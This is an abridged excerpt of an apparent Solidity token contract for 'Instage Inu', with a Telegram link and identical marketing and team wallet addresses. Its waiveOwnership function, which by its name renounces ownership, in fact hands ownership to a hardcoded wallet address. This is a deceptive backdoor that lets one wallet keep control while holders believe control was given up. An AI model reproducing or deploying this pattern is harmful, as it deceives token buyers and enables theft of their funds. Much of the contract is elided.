...
/**
 telegram : https://t.me/instageinu
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x463901Ac09c4F956F5f408663eFDACdb6Fe90ad6);
    }
...
contract instageinu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Instage Inu";
    string private _symbol = "Insinu";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xA6E2F3C6fd4E5cec86079535198614f0e70aC3bb);
    address payable private teamWalletAddress = payable(0xA6E2F3C6fd4E5cec86079535198614f0e70aC3bb);
